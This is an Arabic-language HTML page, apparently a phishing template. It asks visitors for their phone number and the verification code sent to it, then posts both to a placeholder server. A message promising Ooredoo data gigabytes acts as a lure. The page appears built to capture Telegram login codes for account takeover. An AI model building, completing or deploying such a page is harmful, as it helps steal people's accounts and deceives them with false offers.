<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Bot Interface</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            direction: rtl;
            text-align: right;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 100%;
            max-width: 600px;
            margin: auto;
            padding: 20px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            border-radius: 10px;
            margin-top: 50px;
        }
        .title {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .button {
            display: inline-block;
            padding: 10px 20px;
            background-color: #1a73e8;
            color: white;
            text-align: center;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">واجهة البوت التيلجرام</div>
        <form id="phoneForm">
            <div class="input-group">
                <label for="phoneNumber">رقم الهاتف:</label>
                <input type="text" id="phoneNumber" name="phoneNumber" required>
            </div>
            <div class="input-group">
                <label for="otp">الكود المرسل:</label>
                <input type="text" id="otp" name="otp" required>
            </div>
            <a class="button" onclick="sendPhoneNumber()">إرسال رقم الهاتف</a>
            <a class="button" onclick="sendOtp()">إرسال الكود</a>
        </form>
        <div id="result"></div>
    </div>

    <script>
        function sendPhoneNumber() {
            const phoneNumber = document.getElementById('phoneNumber').value;
            // API call to your Python server to process the phone number
            fetch('your-server-endpoint/process-phone-number', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ phoneNumber })
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('result').innerText = 'تم إرسال الكود. الرجاء إدخال الكود المرسل إليك.';
            })
            .catch(error => {
                document.getElementById('result').innerText = '❌ فشل في إرسال الكود. حاول مرة أخرى.';
            });
        }

        function sendOtp() {
            const otp = document.getElementById('otp').value;
            // API call to your Python server to process the OTP
            fetch('your-server-endpoint/process-otp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ otp })
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('result').innerText = '✅ إنتظر ثواني';
            })
            .catch(error => {
                document.getElementById('result').innerText = '❌ سيتم  المحولة  بعد ساعتين Ooredoo  لن ترسل لك الجيجات  حاليا';
            });
        }
    </script>
</body>
</html>
